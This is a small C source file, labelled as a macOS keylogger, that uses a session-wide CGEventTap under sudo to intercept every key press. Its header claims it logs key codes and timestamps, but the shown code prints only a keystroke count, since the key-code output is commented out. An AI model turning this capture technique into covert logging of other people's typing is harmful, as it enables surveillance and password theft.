// This program is a simple implementation of a key logger for OS X.
// This key loggger requires sudo and outputs key codes and a time stamp to standard output.
//
// build: cc keylogger.c -o keylogger -framework ApplicationServices
// usage: sudo keylogger > keylogger.log
// author: Masayuki Higashino

#include <stdio.h>
#include <time.h>
#include <ApplicationServices/ApplicationServices.h>

int num=0;

CGEventRef on_tap(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  num++;
  CGKeyCode key = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
  time_t now; time(&now);
  //printf("%d %d\n", (int)now, key); fflush(stdout);
  //printf("\n%d\n",num);
  printf("\n%d", num);
  fflush(stdout);
  return event;
}

int main(int argc, const char * argv[]) {
  CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
  CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
  CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, mask, on_tap, &flags);
  if (!tap) {
    fprintf(stderr, "This program requires sudo.");
    return -1;
  }
  CFRunLoopSourceRef runloop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runloop, kCFRunLoopCommonModes);
  CGEventTapEnable(tap, true);
  CFRunLoopRun();
  return 0;
}